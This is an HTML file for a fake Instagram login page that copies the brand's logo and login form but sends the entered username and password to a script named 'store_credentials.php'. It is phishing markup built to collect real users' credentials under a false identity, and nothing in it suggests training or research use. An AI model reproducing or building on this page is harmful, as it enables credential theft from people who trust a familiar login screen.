<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <div class="top">
                <div class="logo">
                    <img src="instagram.png" alt="instagram" style="width: 175px;">
                </div>
                <div class="form">
                    <form method="post" action="store_credentials.php">
                        <div class="input_field">
                            <input type="text" name="username" placeholder="Phone number, username, or email" class="input">
                        </div>
                        <div class="input_field">
                            <input type="password" name="password" placeholder="Password" class="input">
                        </div>
                        <div class="btn">
                           <input type="submit" value="Log In">
                        </div>
                    </form>
                </div>
                <!-- Rest of the code -->
            </div>
        </div>
        <!-- Rest of the code -->
    </div>
</body>
</html>
